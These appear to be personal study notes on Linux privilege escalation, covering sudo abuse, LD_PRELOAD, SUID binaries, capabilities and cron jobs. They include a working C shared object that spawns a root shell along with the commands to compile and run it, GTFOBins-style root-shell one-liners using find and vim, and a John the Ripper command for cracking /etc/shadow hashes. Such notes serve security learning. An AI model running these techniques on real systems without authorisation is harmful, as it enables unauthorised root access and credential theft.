# Privilege Escalation: SUDO 
The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.

Any user can check its current situation related to root privileges using the `sudo -l` command.

## Leverage application functions
Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.
In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile).

## Leverage LD_PRELOAD 
LD_PRELOAD is a function that allows any program to use shared libraries. This blog post will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows;
1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows; (save code as shell.c)
``` C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;
`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

We need to run the program by specifying the LD_PRELOAD option, as follows;
`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

Use this to find how to execute the tools in unprivileged enviornment
https://gtfobins.org/gtfobins/nmap/

you can execute `find` commands using 
`sudo find . -exec /bin/sh \; -quit`


# Privilege Escalation: SUID
`find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set. It will show what code has a special permision. It is denotes as " s " in the permission tab. 

Use jhon the ripper to crack the hash from `/etc/shadow` it uses the format `sha512crypt`
`john --format=sha512crypt /<wordlist> /hash.txt`


# Privilege Escalarion: Capabilities
System administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.

We can use `getcap` tool to list all the enabled capabilities.
When run as an unprivileged user,` getcap -r /` will generate a huge amount of errors, so it is good practice to redirect the error messages to `/dev/null` using `getcap -r / 2>/dev/null`.

`./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'` you can use this command to escalate the privilege from user to root.


# Privilege Escalation: CRON JOBs
Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions. The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.

Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.

Any user can read the file keeping system-wide cron jobs under `/etc/crontab`

If any file will run using the cron tab then you will see it starting with the ( ******* ) line 
